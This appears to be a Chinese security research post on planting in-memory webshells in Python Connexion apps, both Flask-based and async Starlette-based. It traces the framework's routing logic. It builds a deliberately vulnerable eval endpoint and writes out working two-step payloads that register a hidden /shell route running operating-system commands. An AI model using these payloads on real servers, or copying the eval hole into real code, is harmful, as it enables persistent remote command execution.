---
slug: tiangongarticle69
date: 2025-04-09
title: Connexion API内存马植入研究
author: p0melo
tags: ["python","内存马"]
---


### 一、前言

Connexion 是一个现代 Python Web 框架， 使用 OpenAPI 规范直接驱动 Python Web API 开发，兼容同步（WSGI）和异步（ASGI）场景。本文将通过一个Connexion框架下一个代码执行的例子，探索这2种场景的内存马植入方式。

### 二、一个简单的Connexion API应用

Connexion API可以通过`FlaskApp`（同步）和`AsyncApp`（异步）两种方式创建，通过`FlaskApp`创建的代码如下：

```python
from connexion import FlaskApp

app = FlaskApp(__name__)
app.add_api('openapi.yml')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
```

或者通过`AsyncApp`创建（官方推荐）：

```python
from connexion import AsyncApp

app = AsyncApp(__name__)
app.add_api('openapi.yml')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
```

启动前需要编写一个`openapi.yml`来定义API 的结构，包括接口对应的处理方法

```yaml
openapi: 3.0.0

info:
  title: Simple Connexion API
  version: 1.0.0

paths:
  /eval:
    post:
      operationId: api.eval.run
      requestBody:
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              required:
                - data
              properties:
                data:
                  type: string
      responses:
        '200':
          description: OK
          content:
            text/plain:
              schema:
                type: string
```

`operationId`定义的是`api.eval.run`，所以需要在在`api`目录下的`eval.py`中定义一个`run`方法，我们模拟一个代码执行漏洞

```python
async def run(body):
    data = body.get('data')
    eval_result = eval(data)
    return {"eval result: ": eval_result}
```

测试通过`/eval`接口执行代码：

 ![](/attachments/2025-04-09-connexion-api/858def1b-6a31-4d56-9674-90565cbc7a18.png " =756x178")

如何通过上面代码执行接口注入python内存马？

### 三、FlaskApp启动方式植入内存马

通过`connexion/apps/flask.py`，查看FlaskApp的定义：

```python
class FlaskApp(AbstractApp):
    _middleware_app: FlaskASGIApp

    def __init__(self,......):
        self._middleware_app = FlaskASGIApp(import_name, server_args or {})

        super().__init__(import_name,......)

        self.app = self._middleware_app.app  #1
        self.app.register_error_handler(
            werkzeug.exceptions.HTTPException, self._http_exception
        )
        ......
        
        
import flask
......
class FlaskASGIApp(SpecMiddleware):
    def __init__(self, import_name, server_args: dict, **kwargs):
        self.app = flask.Flask(import_name, **server_args) #2
        ......
```

`FlaskASGIApp`的`app`属性赋值`FlaskApp`的`app`属性（`#1`），而`FlaskASGIApp`类里app就是flask框架的实例化（`#2`），`FlaskApp`可以看作是对`Flask`框架的封装。所以可以参考Flask框架植入内存马的payload去做修改。

参考[4uuu之前的文章](https://mp.weixin.qq.com/s/CWS9ImeFZGpDUbQKqbKE-w)里的flask植入分下面两个步骤（也可以参考网上其他已公开的方法）：

```python
#1
app.url_map.add(app.url_rule_class('/shell',methods=['get'],endpoint='shell'))

#2
app.view_functions.update({'shell':lambda:__import__('os').popen('id').read()})
```

现在需要先获取`app`变量（`FlaskASGIApp`的对象）去操作内存中的路由，由于`connexion`规范下，方法定义通常在各单独的文件中（例如前面`api/eval.py`的定义），通常并不会在文件中`import app`，所以如果在`eval`中直接调用`app`会报`NameError: name 'app' is not defined`的错误，可以通过下面反射方式调用`FlaskASGIApp`对象。

```python
__import__('sys').modules['__main__'].__dict__['app']
```

`FlaskASGIApp`的`app`属性才是`flask`对象，通过下面语句获得`flask`对象：

```python
__import__('sys').modules['__main__'].__dict__['app'].app
```

将`app`进行替换，所以步骤1修改为：

```python
__import__('sys').modules['__main__'].__dict__['app'].app.url_map.add(__import__('sys').modules['__main__'].__dict__['app'].app.url_rule_class('/shell',methods=['get'],endpoint='shell'))
```

步骤2修改为：

```python
__import__('sys').modules['__main__'].__dict__['app'].app.view_functions. update({'shell':lambda:__import__('os').popen('id').read()})
```

如果需要接收请求中的命令，则将步骤2修改为：

```python
__import__('sys').modules['__main__'].__dict__['app'].app. view_functions.update({'shell':lambda:__import__('os').popen(__import__('sys'). modules['__main__'].__dict__['app'].app.request_context.__globals__['request_ctx'].request.args.get('cmd','id')).read()})
```

发送步骤1、2的请求后，即可访问新增的`/shell`路由，效果如下：

 ![](/attachments/2025-04-09-connexion-api/85b87401-bdfe-4ee2-b116-4cc6190d29bd.png " =1045x354")

### 四、AsyncApp启动方式植入内存马

从 Connexion 3.x 开始，支持将底层从 `Flask` 替换为 `Starlette`，从而兼容 异步（ASGI）场景。在这种场景下如何植入内存马？

#### 4.1 add_url_rule尝试

查看`AsyncApp`定义，有一个`add_url_rule`方法：

```python
class AsyncApp(AbstractApp):
    self._middleware_app: AsyncASGIApp = AsyncASGIApp()
    ......
    def add_url_rule(  
        self,
        rule,
        endpoint: t.Optional[str] = None,
        view_func: t.Optional[t.Callable] = None,
        **options,
    ):
        self._middleware_app.add_url_rule(  #1
            rule, endpoint=endpoint, view_func=view_func, **options
        )
    ......
```

会调用`AsyncASGIApp`对象的`add_url_rule`方法（`#1`）：

```python
class AsyncASGIApp(RoutedMiddleware[AsyncApi]):
    def add_url_rule(
        self,
        rule,
        endpoint: t.Optional[str] = None,
        view_func: t.Optional[t.Callable] = None,
        methods: t.List[str] = None,
        **options,
    ):
        self.router.add_route(rule, endpoint=view_func, name=endpoint, methods=methods)
        
        
class Router:
    def add_route(
        self,
        path: str,
        endpoint: typing.Callable[[Request], typing.Awaitable[Response] | Response],
        methods: list[str] | None = None,
        name: str | None = None,
        include_in_schema: bool = True,
    ) -> None:  ## pragma: no cover
        route = Route(
            path,
            endpoint=endpoint,
            methods=methods,
            name=name,
            include_in_schema=include_in_schema,
        )
        self.routes.append(route) #2
```

跟进，最后会在`AsyncASGIApp`对象的`router.routes`列表中下增加一个`route`（`#2`），所以直接尝试通过调用这方法增加一个路由，paylaod如下：

```python
__import__('sys').modules['__main__'].__dict__['app'].add_url_rule('/shell','shell',lambda:__import__('os').popen('id').read())
```

请求没有报错：

 ![](/attachments/2025-04-09-connexion-api/2fcd0cb5-23a5-46ff-8452-58a6d9a932d1.png " =912x183")

接着访问`/shell`路由，但结果404：

 ![](/attachments/2025-04-09-connexion-api/24d070de-dac8-4511-90f5-2fd95e86e6e1.png " =679x255")

在`connexion.apps.asynchronous.AsyncASGIApp.add_url_rule`处下断点，再次请求增加路由的payload：

 ![](/attachments/2025-04-09-connexion-api/85cf3e81-f84c-4922-9f82-e4bacef307c6.png " =983x477")

发现刚才请求的那条`route`确实已经添加进了`AsyncASGIApp`对象的`router.routes`列表中，但为何请求/shell还是404呢？

#### 4.2 请求路由分发逻辑

再次请求`/shell`路由，调试跟踪下路由分发的逻辑看看。

根据调用栈可以看到每个请求会通过**functor 模式**的方式挨个调用ASGI 中间件处理。

> 如果一个类实现了 `call` 方法，那么这个类的实例就可以像函数一样被调用，这样的实例就称为函数对象（functor）。这种设计模式通常被称为**functor 模式**或**可调用对象模式**。functor 模式使得对象既具有数据（状态）又具有行为（调用逻辑），从而像函数一样被调用。

 ![](/attachments/2025-04-09-connexion-api/41957b2d-89a7-4aba-be75-32f754c98437.png " =1613x906")

可以看到每个app都属性都包含了下一个ASGI 中间件app，依次调用app的`__call__`方法，包含有有下面关键的3个中间件：

```python
class SwaggerUIMiddleware(SpecMiddleware)
class RoutingMiddleware(SpecMiddleware)
class AsyncASGIApp(RoutedMiddleware[AsyncApi])
```

先看`SwaggerUIMiddleware`中间件的`__call__`方法：

```python
class SwaggerUIMiddleware(SpecMiddleware):
    async def __call__(self, scope: Scope, receive: Receive, send: Send) -> None:
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        _original_scope.set(scope.copy())
        await self.router(scope, receive, send) #1
```

会作为方法一样调用其`router`属性（`#1`），也就是调用`router`对象的`__call__`方法：

```python
class Router:    
    async def app(self, scope: Scope, receive: Receive, send: Send) -> None:
        ......
        for route in self.routes:
            match, child_scope = route.matches(scope)  #1
            if match == Match.FULL:
                scope.update(child_scope)
                await route.handle(scope, receive, send)
                return
            elif match == Match.PARTIAL and partial is None:
                partial = route
                partial_scope = child_scope

        if partial is not None:
            scope.update(partial_scope)
            await partial.handle(scope, receive, send)
            return
        ......

        await self.default(scope, receive, send) #2
        
     ......   
```

然后会走到`router`类的`app`方法做路由匹配（`#1`），如果都没匹配到则调用`default`方法继续往下一个中间件走（`#2`），继续往下调用下一个中间件的`router`类的`app`方法，以此类推。

 ![](/attachments/2025-04-09-connexion-api/4eb4e5b6-3085-4409-855d-6837d9d7f738.png " =1216x652")

当前面2个负责路由的中间件（`SwaggerUIMiddleware`和`RoutingMiddleware`）都匹配不中`/shell`接口，后续会走到`AsyncASGIApp`对象的`router`属性的`app`方法做路由匹配，会先匹配中的`router.routes[0]`，因为这里`path`是空，是全路径匹配，然后递归匹配其`routes`列表（`router.routes[0].routes`）中的路由。

由于`router.routes[0].routes`是空，匹配不中会直接抛出`not_found`的404异常，并不会继续遍历后续的元素，而前面通过`eval`代码执行增加的`/shell`路由在`router.routes[1]`，所以走不到就抛出异常了。

这也就解释了前面通过`add_url_rule`增加的`/shell`路由为什么请求不到。

#### 4.3 最终构造

所以可以想办法在`AsyncASGIApp -> router.routes[0].routes`里增加一个route。

由于没找到直接动态的实例化一个`starlette/Route`对象的办法，所以通过前面`connexion.apps.asynchronous.AsyncApp.add_url_rule`方法先生成一个`Route`对象，还是生成到`AsyncASGIApp -> router.routes[1]`位置，第1步发送下面payload：

```python
__import__('sys').modules['__main__'].__dict__['app'].add_url_rule ('/shell','shell',lambda:__import__('os'). popen('id').read())
```

然后通过全局变量的方式获取到`AsyncASGIApp -> router.routes[0].routes`，将生成的`route`对象`append`进去。为了方便定位到`AsyncASGIApp`在全局字典中的位置，可以新增一个测试接口，通过调试查看。

 ![](/attachments/2025-04-09-connexion-api/9a23f596-8fc7-4565-937a-7cbf9470da8b.png " =1022x922")

可以通过下面一句话将`router.routes[1]`元素append到`router.routes[0].routes`中：

```python
[m.router for m in __import__('sys').modules['__main__'].__dict__['app']. middleware.middleware_stack if m.__class__.__name__ == 'AsyncASGIApp'] [0].routes[0].routes.append([m.router for m in __import__('sys'). modules['__main__'].__dict__['app'].middleware.middleware_stack if m.__class__.__name__ == 'AsyncASGIApp'][0].routes[-1])
```

这里取`-1`下标是适配增加多个路由的情况。  通过上面2步请求过后，再次请求`/shell`发现不是404了，证明路由增加成功了，但返回了500，后端报了下面错误：

```python
TypeError: <lambda>() takes 0 positional arguments but 1 was given
```

回看`add_url_rule`方法实现：

```python
class AsyncASGIApp(RoutedMiddleware[AsyncApi]):
    def add_url_rule(
        self,
        rule,
        endpoint: t.Optional[str] = None,
        view_func: t.Optional[t.Callable] = None, #1
        methods: t.List[str] = None,
        **options,
    ):
        self.router.add_route(rule, endpoint=view_func, name=endpoint, methods=methods)  
```

参数`view_func`是一个可调用对象（`#1`），然后传入`Starlette`的`Router`类的`add_route`方法：

```python
class Router:
    def add_route(
        self,
        path: str,
        endpoint: typing.Callable[[Request], typing.Awaitable[Response] | Response],   #1
        methods: list[str] | None = None,
        name: str | None = None,
        include_in_schema: bool = True,
    ) -> None:  ## pragma: no cover
        route = Route(
            path,
            endpoint=endpoint,
            methods=methods,
            name=name,
            include_in_schema=include_in_schema,
        )
        self.routes.append(route)
```

跟进`add_route`发现`endpoint`对象需要有`Request`和`Response`两个类型的参数要求（`#1`）。

而前面第一步payload中的`lamda`表达式并没有指定任何参数，因而在路由调用时会报 `takes 0 positional arguments but 1 was given` 的错误。所以将`lamda`表达式修改如下：

```python
lambda request: __import__('starlette.responses',fromlist=['PlainTextResponse']). PlainTextResponse(__import__('os').popen('id').read())
```

如果需要通过请求传参数来控制执行的命令，可以修改成如下：

```python
lambda request: __import__('starlette.responses',fromlist=['PlainTextResponse']). PlainTextResponse(__import__('os').popen (request.query_params.get('cmd','id')).read())
```

最终的2步走payload：

```python
## 1
__import__('sys').modules['__main__'].__dict__['app']. add_url_rule('/shell','shell',lambda request: __import__('starlette.responses', fromlist=['PlainTextResponse']).PlainTextResponse(__import__('os'). popen(request.query_params.get('cmd','id')).read()),methods=['GET'])

## 2
[m.router for m in __import__('sys').modules['__main__']. __dict__['app'].middleware.middleware_stack if m.__class__.__name__ == 'AsyncASGIApp'] [0].routes[0].routes.append([m.router for m in __import__('sys'). modules['__main__'].__dict__['app'].middleware.middleware_stack if m.__class__. __name__ == 'AsyncASGIApp'][0].routes[-1])
```

请求上面2步后，可以看到内存中`/shell`对应的`routes`所在的位置正确：

 ![](/attachments/2025-04-09-connexion-api/808ece8d-7501-4527-8e19-86855f1b0742.png " =586x346")

请求`/shell`接口效果如下，内存马增加成功，成功执行命令：

 ![](/attachments/2025-04-09-connexion-api/972030ad-c46b-4575-886f-a33239f8bcdb.png " =1105x536")

其实也可以在`RoutingMiddleware`和`SwaggerUIMiddleware`中间件中构造内存马，原理和`AsyncASGIApp`一样，由于都是在对应中间件的`router.routes[0].routes`列表中增加一个`AsyncASGIApp`对象下的`route`，所以只需要将第2步的中间件名称更换即可，例如`RoutingMiddleware`如下：

```python
[m.router for m in __import__('sys').modules['__main__'].__dict__['app']. middleware.middleware_stack if m.__class__.__name__ == 'RoutingMiddleware'] [0].routes[0].routes.append([m.router for m in __import__('sys'). modules['__main__'].__dict__['app'].middleware.middleware_stack if m.__class__.__name__ == 'AsyncASGIApp'][0].routes[-1])
```

`SwaggerUIMiddleware`如下：

```python
[m.router for m in __import__('sys').modules['__main__'].__dict__['app']. middleware.middleware_stack if m.__class__.__name__ == 'SwaggerUIMiddleware'] [0].routes[0].routes.append([m.router for m in __import__('sys'). modules['__main__'].__dict__['app'].middleware.middleware_stack if m.__class__.__name__ == 'AsyncASGIApp'][0].routes[-1])
```

### 五、总结

文章通过一个Python Connexion框架代码执行漏洞的例子，探索FlaskApp和AsyncApp这2种启动方式的内存马植入，重点介绍了AsyncApp异步启动方式的路由分发逻辑，解释了动态增加路由后无法直接访问的原因，最终构造出通过2步请求完成AsyncApp方式启动的内存马植入。